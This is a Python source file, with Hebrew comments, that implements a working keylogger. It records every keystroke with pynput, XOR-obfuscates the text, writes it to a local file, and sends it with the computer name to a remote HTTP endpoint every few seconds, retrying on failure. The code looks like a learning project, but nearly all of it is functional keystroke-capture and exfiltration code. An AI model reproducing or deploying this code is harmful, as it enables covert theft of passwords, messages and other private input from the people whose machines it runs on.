from abc import ABC, abstractmethod
from typing import List
from pynput import keyboard
import datetime
import time
import threading
import requests
import os
import logging
import  sys # אפוציה לתת אפשרות לשים סיסמה לא חייב

# הגדרת לוגים אם רוצים לא חייב
logging.basicConfig(filename="keylogger.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# ממשק אחיד ל-KeyLogger
class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

# מימוש המחלקה KeyLoggerService
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            self.logged_keys.append(key.char)
        except AttributeError:
            self.logged_keys.append(f'[{key}]')

    def start_logging(self) -> None:
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        keys = self.logged_keys[:]
        self.logged_keys.clear()
        return keys

# מחלקת הצפנה XOR
class Encryptor:
    def __init__(self, key: int):
        self.key = key

    def xor_encrypt(self, data: str) -> str:
        return ''.join(chr(ord(char) ^ self.key) for char in data)

    def xor_decrypt(self, data: str) -> str:
        return ''.join(chr(ord(char) ^ self.key) for char in data)

# מחלקת כתיבה לקובץ
class FileWriter:
    def __init__(self, filename: str, encryptor: Encryptor):
        self.filename = filename
        self.encryptor = encryptor

    def send_data(self, data: str, machine_name: str) -> None:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        encrypted_data = self.encryptor.xor_encrypt(data)
        with open(self.filename, 'a', encoding='utf-8') as file:
            file.write(f'[{timestamp}] {machine_name}: {encrypted_data}\n')

# מחלקת כתיבה לרשת
class NetworkWriter:
    def __init__(self, server_url: str, encryptor: Encryptor):
        self.server_url = server_url
        self.encryptor = encryptor

    def send_data(self, data: str, machine_name: str) -> None:
        encrypted_data = self.encryptor.xor_encrypt(data)
        payload = {"machine": machine_name, "data": encrypted_data}

        retries = 3
        for attempt in range(retries):
            try:
                response = requests.post(self.server_url, json=payload, timeout=5)
                response.raise_for_status()
                print("Data sent successfully")
                return
            except requests.RequestException as e:
                logging.error(f"Error sending data to server (Attempt {attempt + 1}): {e}")
                time.sleep(2)

        print("Failed to send data after retries.")

# מחלקת ניהול KeyLogger
class KeyLoggerManager:
    def __init__(self, keylogger: IKeyLogger, writers: List[FileWriter | NetworkWriter], interval: int = 5):
        self.keylogger = keylogger
        self.writers = writers
        self.interval = interval
        self.running = False
        self.thread = None

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        self.keylogger.stop_logging()
        self.flush_buffer()

    def run(self):
        while self.running:
            time.sleep(self.interval)
            self.flush_buffer()

    def flush_buffer(self):
        keys = self.keylogger.get_logged_keys()
        if keys:
            data = ''.join(keys)
            machine_name = os.getenv('COMPUTERNAME', 'UnknownPC')
            for writer in self.writers:
                writer.send_data(data, machine_name)

if __name__ == "__main__":
    # args = sys.argv[1:]  קשור לספריית sys
    # print(args)  קשור לספריית sys
    encryption_key = 123
    encryptor = Encryptor(key=encryption_key)
    network_writer = NetworkWriter("http://127.0.0.1:5000/api/upload", encryptor)
    file_writer = FileWriter("keylogs.txt", encryptor)

    keylogger = KeyLoggerService()
    manager = KeyLoggerManager(keylogger, [network_writer, file_writer])

    print("Starting KeyLogger...")
    manager.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping KeyLogger...")
        manager.stop()
